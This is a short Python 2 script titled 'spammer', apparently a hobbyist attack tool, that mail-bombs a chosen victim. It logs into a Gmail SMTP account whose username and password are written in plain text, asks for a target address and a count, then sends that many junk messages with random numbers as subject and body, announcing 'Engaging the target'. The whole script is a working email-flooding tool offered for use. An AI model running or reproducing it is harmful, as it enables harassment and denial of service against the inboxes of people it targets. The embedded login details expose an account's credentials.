# -*- coding: UTF-8 -*-
import smtplib
import datetime
import random
import getpass

class spammer():
    def __init__(self):
        self.banner()
        self.spam()

    def banner(self):
        print """
 ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗
 ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
 ███████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
 ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
 ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
 ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                                            Hades.y2k
                                                            """

    def spam(self):
        # Credentials
        username = "testing.pylab@gmail.com"
        password = "pylab@2016" #getpass.getpass()
        target = raw_input("Target email: ")
        spams = input("No. of mails to send:  ")

        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        try: server.login(username, password)
        except: print "[-] Authentication Error" ; exit()

        print "[!] Engaging the target"
        for i in xrange(spams):

            subj = random.randrange(0,100)
            content = random.randrange(0,100)
            name = random.randrange(0,100)
            date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )
            msg = "From: %s\nTo: %s\nSubject: %s\nDate: %s\n\n%s" % (name, target, subj, date, content)

            server.sendmail(username, target, msg)
        server.quit()
        print "[+] Target engaging complete"

try:
    spammer()
except KeyboardInterrupt:
    print "\n[-] Program Interrupted"
    exit()
